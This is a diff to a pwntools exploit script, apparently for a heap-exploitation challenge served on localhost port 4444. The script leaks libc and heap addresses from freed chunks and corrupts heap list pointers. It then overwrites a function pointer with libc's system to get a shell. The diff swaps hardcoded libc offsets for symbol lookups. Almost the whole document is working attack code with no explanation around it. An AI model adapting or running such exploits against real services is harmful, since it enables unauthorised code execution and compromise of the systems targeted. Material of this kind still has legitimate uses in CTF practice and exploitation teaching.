@@ -3,7 +3,7 @@ from pwn import *
 # Tested on Ubuntu 16.04
 
 def menu(n):
-	s.sendafter("Exit", str(n) + "\n")
+	s.sendafter("Exit\n", str(n) + "\n")
 
 def add(i, sz, c):
 	menu(1)
@@ -36,6 +36,8 @@ buffer_1->fd = buffer_2
 victim->bk   = buffer_2
 '''
 
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+
 s = remote("localhost", 4444)
 add(0, 256, "")
 add(1, 256, "")
@@ -44,15 +46,15 @@ add(3, 256, "")
 delete(0)
 delete(2)
 data = printa(0)
-libc_base = u64(data[:16].ljust(8, '\0')) - 0x3C4B78
+libc_base = u64(data[:16].ljust(8, '\0')) - 0x3c4b78
 data = printa(2)
 heap = u64(data[:16].ljust(8, '\0'))
 print "[+] heap: 0x%08x" % heap
 print "[+] libc_base: 0x%08x" % libc_base
 delete(1)
 delete(3)
-p_system = libc_base + 0x45390
-p_puts = libc_base + 0x6f690
+p_system = libc_base + libc.symbols['system']
+p_puts = libc_base + libc.symbols['puts']
 add(0, 256, "") # buffer_2 = 0x603000
 add(1, 256, "") # buffer_1 = 0x603110
 add(2, 512, "") # victim = 0x603220
@@ -72,5 +74,6 @@ update(3, p64(p_system) + p64(p_puts)) # 2nd parameter for no match puts()
 update(4, p64(heap + 0x30))
 delete(4)
 print "[+] got shell ?"
+
 s.interactive()
 
